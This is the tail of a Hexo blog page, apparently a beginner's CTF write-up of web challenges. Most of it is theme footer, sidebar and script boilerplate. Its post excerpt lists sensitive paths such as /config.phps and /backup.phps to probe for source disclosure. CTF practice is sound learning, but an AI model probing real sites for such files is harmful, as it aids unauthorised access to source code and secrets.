+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A5%E5%87%A0%E4%B8%AAwriteup"><span class="toc-number">1.</span> <span class="toc-text">来几个writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">1.1.</span> <span class="toc-text">一.攻防世界</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php2-web"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.php2(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CatCatCat-misc"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.CatCatCat(misc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ics-06-web"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.ics-06(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-view-source"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.view_source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Web-php-include-web"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.Web_php_include(web)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup01"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">writeup01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup02"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">writeup02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup03"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">writeup03</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-upload1-web"><span class="toc-number">1.1.6.</span> <span class="toc-text">5.upload1(web)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-buuctf"><span class="toc-number">1.2.</span> <span class="toc-text">二.buuctf</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">19</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Cl1ck-t0",
+          title: "简单题writeup",
+          url: "https://cl1ck-t0.github.io/2026/01/31/%E7%AE%80%E5%8D%95%E9%A2%98writeup/",
+          excerpt: "",
+          description: "",
+          stripContent: "来几个writeup这里将长期更新我作为新手遇到的有趣的题目的个人做题想法与见解，不定期更新，写手水平较菜，有问题请提出哦。 一.攻防世界1.php2(web)首页我们可以看到：   Can you anthenticate to this website?  在这里我们首要想到尝试访问首页和一些关键目录及敏感文件   1234567891011/index.phps /login.phps /admin.phps /config.phps /flag.phps /backup.phps /in",
+          date: "Sat Jan 31 2026 18:19:14 GMT+0800",
+          updated: "Thu Feb 05 2026 21:10:58 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'Cl1ck-t0/Cl1ck-t0.github.io');
+        script.setAttribute('issue-term', 'title');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
